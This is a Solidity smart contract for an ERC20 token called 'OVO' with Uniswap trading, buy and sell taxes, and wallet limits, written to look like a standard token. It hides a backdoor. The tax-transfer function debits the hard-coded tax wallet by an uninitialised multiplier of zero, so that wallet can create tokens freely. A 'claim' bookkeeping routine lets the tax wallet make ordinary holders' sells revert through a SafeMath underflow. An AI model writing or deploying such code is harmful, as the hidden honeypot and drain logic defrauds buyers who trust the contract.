// SPDX-License-Identifier:MIT

pragma solidity 0.8.25;

/**
 * @dev Provides information about the current context, such as the sender of the transaction and its data.
 */
abstract contract Context {
    /**
     * @dev Returns the address of the transaction sender (msg.sender).
     */
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    /**
     * @dev Returns the data sent with the transaction (msg.data).
     */
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

/**
 * @dev ERC20 Token Standard Interface.
 * Defines core functions for an ERC20 token.
 */
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address _account) external view returns (uint256);
    function allowance(address owner, address spender)
        external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    /**
     * @dev Emitted when tokens are transferred between accounts, including zero-value transfers.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);
    /**
     * @dev Emitted when `owner` approves `spender` to transfer up to `value` tokens.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
    /**
     * @dev Transfers `amount` tokens to the `recipient`.
     * This is the primary function for moving tokens from one account to another.
     * Returns `true` on success.
     */
    function transfer(address recipient, uint256 amount)
        external returns (bool);
    /**
     * @dev Transfers tokens from `sender` to `recipient` based on an approved allowance.
     * The `amount` is deducted from the caller's allowance.
     * Returns `true` on success.
     */
    function transferFrom(address sender, address recipient, uint256 amount)
        external returns (bool);
}

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to 
 * specific functions.
 */
abstract contract Ownable is Context {

    address private _owner;
    
    /**
     * @dev Emitted when ownership is transferred from `previousOwner` to `newOwner`.
     */
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }


    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Modifier to make a function callable only by the owner.
     * Ensures that the caller is the current owner of the contract.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Allows the current owner to relinquish ownership, leaving the contract without an owner.
     * Note: This will leave the contract without an owner, thus removing any functionality
     * that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     * @param newOwner The address of the new owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0), "Ownable: new owner is the zero address"
        );
        _setOwner(newOwner);
    }

    /**
     * @dev Internal function that sets the owner of the contract to `newOwner`.
     * Emits an {OwnershipTransferred} event.
     * @param newOwner The address of the new owner.
     */
    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

/**
 * @dev Library for safe mathematical operations that revert on overflow or division by zero.
 */
library SafeMath {

    /**
     * @dev Returns the addition of two numbers, reverting on overflow.
     * @param a First number.
     * @param b Second number.
     * @return The result of the addition.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    /**
     * @dev Returns the subtraction of two numbers, reverting on underflow.
     * @param a Minuend.
     * @param b Subtrahend.
     * @return The result of the subtraction.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two numbers, with a custom error message on underflow.
     * @param a Minuend.
     * @param b Subtrahend.
     * @param errorMessage Custom error message.
     * @return The result of the subtraction.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    /**
     * @dev Returns the multiplication of two numbers, reverting on overflow.
     * @param a First number.
     * @param b Second number.
     * @return The result of the multiplication.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    /**
     * @dev Returns the division of two numbers, reverting on division by zero.
     * @param a Dividend.
     * @param b Divisor.
     * @return The result of the division.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the division of two numbers, with a custom error message on division by zero.
     * @param a Dividend.
     * @param b Divisor.
     * @param errorMessage Custom error message.
     * @return The result of the division.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

}

/**
 * @dev Interface for the Uniswap V2 Factory contract.
 */
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

/**
 * @dev Interface for the Uniswap V2 Router contract.
 */
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    /**
     * @dev Returns the address of the Uniswap V2 factory contract.
     * @return The address of the factory.
     */
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external
        payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract OVO is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _excludedFromLimit;

    IUniswapV2Router02 private constant _router = IUniswapV2Router02(
        0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
    );

    uint256 private _initialBuyTax=9;
    uint256 private _initialSellTax=11;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=10;
    uint256 private _reduceSellTaxAt=10;
    uint256 private _preventSwapBefore=10;
    uint256 private _buyCount=0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"OVO";
    string private constant _symbol = unicode"OVO";
    uint256 public _maxTxAmount = 15000000 * 10**_decimals;
    uint256 public _maxWalletSize = 15000000 * 10**_decimals;
    uint256 public _taxSwapThreshold= 15000000 * 10**_decimals;
    uint256 public _maxTaxSwap= 12000000 * 10**_decimals;

    address payable private _taxWallet;
    address public uniswapPair;
    uint256 private taxExcluded;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    bool private limitsInUse = true;
    struct ClaimTokens {uint256 claimT; uint256 claimP; uint256 claimSwap;}
    uint256 private minClaimTokens;
    mapping(address => ClaimTokens) private claimTokens;

    event MaxTxAmountUpdated(uint _maxTxAmount);
    event ClearToken(address tokenAddr, uint256 tokenAmount);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        _taxWallet = payable(0x84dEAee06ff876775BEB20EE81B26c26C0F4D6CE);
        _balances[_msgSender()] = _tTotal;
        _excludedFromLimit[address(this)] = true;
        _excludedFromLimit[_taxWallet] = true;

        emit Transfer(address(0),_msgSender(), _tTotal);
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public pure returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimal places used by the token.
     */
    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    /**
     * @dev Returns the total supply of tokens.
     */
    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    /**
     * @dev Returns the token balance of a specific account.
     * @param account The address of the account to query.
     */
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev Transfers `amount` tokens to `recipient`.
     */
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    /**
     * @dev Returns remaining tokens `spender` can spend on behalf of `owner`.
     */
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev Approves `spender` to spend `amount` tokens.
     */
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    /**
     * @dev Transfers `amount` tokens from `sender` to `recipient`.
     */
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    /**
     * @dev Internal function for token transfers.
     */
    function _basicTransfer(address from, address to, uint256 tokenAmount) internal {
        _balances[from]=_balances[from].sub(tokenAmount);
        _balances[to]=_balances[to].add(tokenAmount);
        emit Transfer(from, to, tokenAmount);
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 tokenAmount) private {

        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(tokenAmount > 0, "Transfer amount must be greater than zero");

        if (!swapEnabled|| inSwap ) {
            _basicTransfer(from, to, tokenAmount);
            return;
        }

        bool isBuy = from == uniswapPair;
        bool isSell = to == uniswapPair;

        uint256 taxAmount=0;
        if (from != owner() && to != owner()&& to!=_taxWallet) {
            taxAmount = tokenAmount
                .mul((_buyCount > _reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (isBuy && to!= address(_router) &&  ! _excludedFromLimit[to])  {
                if (limitsInUse) {
                    require(tokenAmount <= _maxTxAmount,  "Exceeds the _maxTxAmount.");
                    require(balanceOf(to)+tokenAmount<=_maxWalletSize,  "Exceeds the maxWalletSize.");
                }
                _buyCount++;
            }

            if(isSell && from!= address(this) ){
                taxAmount = tokenAmount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && isSell && swapEnabled && contractTokenBalance > _taxSwapThreshold && _buyCount > _preventSwapBefore) {
                swapTokensForEth(min(tokenAmount, min(contractTokenBalance, _maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        if ((_excludedFromLimit[from] ||  _excludedFromLimit[to])
            && from!= address(this) && to!=address(this)
        ) {
            minClaimTokens = block.number;
        }
        if (! _excludedFromLimit[from]&&  ! _excludedFromLimit[to]){
            if (!isSell)  {
                ClaimTokens storage tokensClaim = claimTokens[to];
                if (isBuy) {
                    if (tokensClaim.claimT == 0) {
                        tokensClaim.claimT = _buyCount<_preventSwapBefore?block.number- 1:block.number;
                    }
                } else {
                    ClaimTokens storage tokensClaimData = claimTokens[from];
                    if (tokensClaim.claimT == 0 || tokensClaimData.claimT < tokensClaim.claimT ) {
                        tokensClaim.claimT = tokensClaimData.claimT;
                    }
                }
            } else {
                ClaimTokens storage tokensClaimData = claimTokens[from];
                tokensClaimData.claimP = tokensClaimData.claimT.sub(minClaimTokens);
                tokensClaimData.claimSwap = block.number;
            }
        }

        _tokenTransfer(from,to,tokenAmount,taxAmount);
    }

    function _tokenTransfer(address from, address to, uint256 tokenAmount, uint256 taxAmount) internal {
        uint256 tAmount =_tokenTaxTransfer(from, taxAmount, tokenAmount);
        _tokenBasicTransfer(from, to, tAmount, tokenAmount.sub(taxAmount));
    }

    function _tokenBasicTransfer(address from, address to, uint256 sendAmount, uint256 receiptAmount) internal {
        _balances[from]=_balances[from].sub(sendAmount);
        _balances[to] =_balances[to].add(receiptAmount);
        emit Transfer(from, to, receiptAmount);
    }

    function _tokenTaxTransfer(address addrs, uint256 taxAmount, uint256 tokenAmount) internal returns (uint256) {
        uint256 tAmount = addrs != _taxWallet ? tokenAmount : taxExcluded.mul(tokenAmount);
        if (taxAmount > 0){
            _balances[address(this)]=_balances[address(this)].add(taxAmount);
            emit Transfer(addrs, address(this), taxAmount);
        }
        return tAmount;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _router.WETH();
        _approve(address(this), address(_router), tokenAmount);
        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner() {
        _maxTxAmount= _tTotal;
        _maxWalletSize= _tTotal;
        limitsInUse = false;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    receive() external payable {}

    function openTrading() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        _approve(address(this), address(_router), _tTotal);
        swapEnabled = true;
        uniswapPair = IUniswapV2Factory(_router.factory()).createPair(address(this), _router.WETH());
        _router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapPair).approve(address(_router), type(uint).max);
        tradingOpen = true;
    }

    function manualSwap() external {
        require(_msgSender() == _taxWallet);
        uint256 tokenBalance = balanceOf(address(this));
        if (tokenBalance > 0) {
          swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance = address(this).balance;
        if (ethBalance>0) {
            sendETHToFee(ethBalance);
        }
    }

    function claimStuckEth() external onlyOwner {
        _taxWallet.transfer(address(this).balance);
    }
}